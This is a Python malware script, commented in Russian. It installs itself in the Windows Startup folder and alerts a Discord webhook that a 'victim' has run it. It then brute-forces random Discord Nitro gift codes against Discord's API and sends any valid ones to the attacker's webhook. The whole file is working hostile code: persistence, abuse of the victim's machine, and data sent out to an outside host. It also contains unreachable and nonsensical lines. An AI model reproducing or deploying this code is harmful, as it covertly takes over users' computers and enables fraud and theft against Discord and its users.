# _               _     _ 
#| |             | |   | |
#| |__   __ _  __| | __| |
#| '_ \ / _` |/ _` |/ _` |
#| |_) | (_| | (_| | (_| |
#|_.__/ \__,_|\__,_|\__,_|

URLWEBHOOK = "link"

from ast import Expression
import random
import string
import requests
import os, sys


from discord_webhook import DiscordWebhook


def main(URLWEBHOOK):

	Thisfile = sys.argv[0] # Полный путь к файлу, включая название и расширение
	Thisfile_name = os.path.basename(Thisfile) # Название файла без пути
	user_path = os.path.expanduser('~') # Путь к папке пользователя

	if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
		os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
		print(f'{Thisfile_name} добавлен в автозагрузку')
	try:
		webhook = DiscordWebhook(url=f'{URLWEBHOOK}', content=f'Жертва запустила')
		response = webhook.execute()

		i = 0
		valid = 0
		novalid = 0

		it = 0
		tvalid = 0
		nvalid = 0

		while True:
			i += 1
			code = "".join(random.choices(
			string.ascii_uppercase + string.digits + string.ascii_lowercase,
			k = 16
		))

			nitro = "https://discord.gift/" + code
			r = requests.get(f"https://discordapp.com/api/v9/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true")

			if r.status_code == 404:
				continue
				novalid += 1
			if r.status_code == 200:
				webhook = DiscordWebhook(url=f'{URLWEBHOOK}', content=f'{nitro}')
				response = webhook.execute()
				valid += 1
			elif i == 10000: #можете указать когда он будет присылать сообщения с данными
				webhook = DiscordWebhook(url=f'{URLWEBHOOK}', content=f'10000 {valid} - valid | {novalid} - InValid')
				response = webhook.execute()
			
	except:
		print(0/0)

if __name__ == "__main__":
	main(URLWEBHOOK)